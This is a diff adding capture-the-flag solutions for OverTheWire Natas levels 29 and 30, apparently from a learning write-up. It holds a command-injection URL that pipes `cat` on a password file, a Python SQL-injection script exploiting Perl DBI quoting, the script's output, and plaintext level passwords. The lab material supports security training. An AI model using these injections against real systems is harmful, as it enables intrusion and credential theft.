@@ -4847,7 +4847,7 @@ The suffix (URL-encoded) to append to `query=` in the URL:
 G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BKc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
 ```
 
-An analysis of the blocks (with addede spaces):
+An analysis of the blocks (with added spaces):
 ```
 Full normal query:    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
 Prefix:               G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
@@ -5162,3 +5162,175 @@ if(param('file')){
 ```
 
 How can we bypass it?
+
+We try with `|ls%00`: 
+```bash
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+```
+gives:
+```
+index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
+```
+
+Try with:
+```bash
+https://natas29.natas.labs.overthewire.org/index.pl?file=/etc/natas_webpass/natas30
+```
+This gives:
+```
+meeeeeep!
+```
+as expected.
+
+But:
+```bash
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00
+```
+works:
+```
+WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+```
+
+## Natas 30
+
+### Credentials
+
+Username: natas30
+
+Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+
+URL: http://natas30.natas.labs.overthewire.org
+
+### Message
+
+Asks for a username and a password to login. 
+
+Gives the source code.
+
+### Solution
+
+Let's get the source code:
+```html
+/var/www/natas/natas30/index-source.pl
+
+#!/usr/bin/perl
+use CGI qw(:standard);
+use DBI;
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+END
+
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+```
+
+It seems vulnerable to SQL injection.
+
+Prepare the Python script:
+```python
+import requests
+import urllib
+import string
+import os
+import base64
+
+from utils import utils
+
+basic_auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+
+url = "http://natas30.natas.labs.overthewire.org/"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+def send_request(session) -> str:
+    params = {"username": "natas28", "password": ["'asd' or 1=1--", 4]}
+    response = session.post(url,
+                    headers=headers,
+                    data=params,
+                    verify=False)
+    return response.text
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    res = send_request(session)
+    print(res)
+```
+
+and run it: we get:
+```
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Thus: `natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`.
